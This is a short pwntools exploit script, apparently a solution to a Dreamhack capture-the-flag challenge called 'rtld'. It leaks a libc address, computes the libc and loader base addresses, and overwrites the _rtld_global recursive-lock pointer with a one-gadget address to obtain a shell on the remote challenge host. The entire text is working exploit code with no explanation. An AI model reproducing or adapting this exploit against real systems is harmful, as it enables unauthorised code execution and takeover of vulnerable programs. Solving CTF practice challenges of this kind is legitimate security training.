#!/usr/bin/python3

from pwn import *
import pwn

#p = pwn.process("./rtld")
p = remote("host1.dreamhack.games", 18618)
elf = ELF("./rtld")
log.info("shell: " + hex(elf.symbols['get_shell']))
p.recvuntil("stdout: ")
stdout = int(p.recvuntil("\n").decode('utf-8').strip("\n"),16)

libcBase = stdout - 0x3c5620
ldMap = libcBase + 0x5f0000 # ld Offset
system = libcBase + 0x45390
gadget = libcBase + 0x4526a

rtldGlobal = 0x40 + ldMap
rtldRecursive = rtldGlobal + 3848
rtldLock = rtldGlobal + 2312


p.sendlineafter("addr: ", str(rtldRecursive))
p.sendlineafter("value: ", str(gadget))

log.info("Library Base Address: " + hex(libcBase))
log.info("ld Mapeed Address: " + hex(ldMap))
p.interactive()
